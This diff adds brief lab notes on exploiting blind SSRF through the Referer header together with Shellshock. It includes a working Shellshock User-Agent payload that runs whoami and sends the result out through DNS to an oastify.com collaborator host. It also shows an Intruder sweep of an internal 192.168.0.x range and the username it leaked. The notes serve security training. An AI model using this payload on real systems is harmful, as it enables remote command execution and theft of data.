@@ -1,0 +1,32 @@
+Blind SSRF with Shellshock exploitation
+Vulnerable parameter - Referer header
+Goal: SSRF against internal server 192.168.0.x on 8080, use a shellshock payload to exfiltrate the name of the OS user.
+
+lti2711cuko1v5sosho4vqnea5gw4msb.oastify.com
+
+1)
+-Add lab to scope
+-Collaborator pingback via Collaborator Everywhere extension
+-> Referer header and agent
+-> Agent, root@ibx2sxos10by7ty8uu6u67hf56b4zt.oastify.com
+-> Referer, root@ysui9d58igseo9fobanannyvmmspge.oastify.com
+
+2)
+-Review, https://blog.cloudflare.com/inside-shellshock/
+-> () { :; }; /bin/eject
+
+3)
+-Send get product to repeater
+- Set Agent, User-Agent: () { :; }; /usr/bin/nslookup $(whoami).agutrrvlo6yfvldxhg2ikxp0wr2iq9ey.oastify.com
+- Set Referer, Referer: http://192.168.0.1:8080/
+
+4)
+-Send to intruder
+-Mark 1 of ip
+-Payloads Numbers, 1-255
+-Start
+-> peter-vd5PjY.agutrrvlo6yfvldxhg2ikxp0wr2iq9ey.oastify.com.
+
+Change my DNS
+71.10.216.1
+71.10.216.2
